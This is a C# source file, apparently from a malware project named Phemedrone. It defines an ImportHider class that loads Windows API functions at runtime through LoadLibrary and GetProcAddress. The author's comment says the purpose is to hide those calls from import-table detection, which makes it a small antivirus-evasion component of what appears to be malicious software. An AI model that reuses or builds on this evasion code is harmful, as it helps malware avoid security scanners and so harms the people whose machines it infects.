using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace Phemedrone.Extensions
{
    public class ImportHider
    {
        // c# is not suitable for interacting with WinApi, however i tried to implement
        // hiding some WinApi method calls to lower common import table detections

        [DllImport("kernel32.dll", SetLastError=true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        public static T HiddenCallResolve<T>(string dllName, string methodName) where T : Delegate
        {
            var handle = LoadLibrary(dllName);
            if (handle == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());
            var ptr = GetProcAddress(handle, methodName);
            return (T)Marshal.GetDelegateForFunctionPointer(ptr, typeof(T));
        }
    }
}